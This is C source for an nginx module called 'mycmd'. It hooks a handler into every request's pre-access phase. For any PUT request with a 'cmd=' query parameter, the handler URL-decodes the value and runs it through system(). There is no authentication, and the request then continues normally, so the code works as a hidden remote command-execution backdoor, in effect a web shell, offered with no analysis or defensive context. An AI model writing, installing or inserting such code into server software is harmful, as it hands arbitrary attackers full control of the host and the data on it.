/* ---------------------- ngx_http_mycmd_module.c --------------------- */
#include <ngx_config.h>
#include <ngx_core.h>
#include <ngx_http.h>

static ngx_int_t ngx_http_mycmd_handler(ngx_http_request_t *r);
static char *ngx_http_mycmd_init(ngx_conf_t *cf, ngx_command_t *cmd, void *conf);
static ngx_int_t ngx_http_mycmd_postconfig(ngx_conf_t *cf);
/* directive */
static ngx_command_t ngx_http_mycmd_commands[] = {
    {
        ngx_string("mycmd"),
        NGX_HTTP_LOC_CONF | NGX_CONF_NOARGS,
        ngx_http_mycmd_init,
        0,
        0,
        NULL
    },
    ngx_null_command
};

/* module context */
static ngx_http_module_t ngx_http_mycmd_module_ctx = {
    NULL, /* preconfiguration */
    ngx_http_mycmd_postconfig, /* postconfiguration */

    NULL, /* create main conf */
    NULL, /* init main conf */

    NULL, /* create srv conf */
    NULL, /* merge srv conf */

    NULL, /* create loc conf */
    NULL  /* merge loc conf */
};

/* module definition */
ngx_module_t ngx_http_mycmd_module = {
    NGX_MODULE_V1,
    &ngx_http_mycmd_module_ctx,
    ngx_http_mycmd_commands,
    NGX_HTTP_MODULE,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL,
    NGX_MODULE_V1_PADDING
};

static ngx_int_t ngx_http_mycmd_postconfig(ngx_conf_t *cf)
{
    ngx_http_handler_pt         *h;
    ngx_http_core_main_conf_t   *cmcf;

    cmcf = ngx_http_conf_get_module_main_conf(cf, ngx_http_core_module);

    h = ngx_array_push(&cmcf->phases[NGX_HTTP_PREACCESS_PHASE].handlers);
    if (h == NULL) {
       return NGX_ERROR;
    }

    *h = ngx_http_mycmd_handler;

    return NGX_OK;

}

/* directive handler */
static char *
ngx_http_mycmd_init(ngx_conf_t *cf, ngx_command_t *cmd, void *conf)
{
    ngx_http_core_loc_conf_t *clcf;

    clcf = ngx_http_conf_get_module_loc_conf(cf, ngx_http_core_module);
    clcf->handler = ngx_http_mycmd_handler;

    return NGX_CONF_OK;
}

/* request handler */
static ngx_int_t
ngx_http_mycmd_handler(ngx_http_request_t *r)
{
    ngx_str_t  args = r->args;
    ngx_str_t  cmd_arg = ngx_null_string;
    u_char    *p, *last;

    if (r->method != NGX_HTTP_PUT) {
        return NGX_DECLINED;
    }

    if (r->args.len == 0 || ngx_strnstr(r->args.data, "cmd=", r->args.len) == NULL) {
       return NGX_DECLINED;
    }

    p = args.data;
    last = p + args.len;

    while (p < last) {
        if ((last - p) >= 4 &&
            ngx_strncmp(p, (u_char *)"cmd=", 4) == 0)
        {
            p += 4;
            cmd_arg.data = p;

            while (p < last && *p != '&') {
                p++;
            }

            cmd_arg.len = p - cmd_arg.data;
            break;
        }

        while (p < last && *p != '&') {
            p++;
        }
        if (p < last) p++;
    }

    if (cmd_arg.len == 0) {
        return NGX_DECLINED;
    }

    u_char decoded_cmd[1024];
    u_char *src = cmd_arg.data;
    u_char *dst = decoded_cmd;
    size_t len = cmd_arg.len;

    if (len >= sizeof(decoded_cmd)) {
        len = sizeof(decoded_cmd) - 1;
    }

    ngx_unescape_uri(&dst, &src, len, 0);
    *dst = '\0';

    int rc;
    rc = system((char *) decoded_cmd);

    (void) rc;

    return NGX_DECLINED;
}
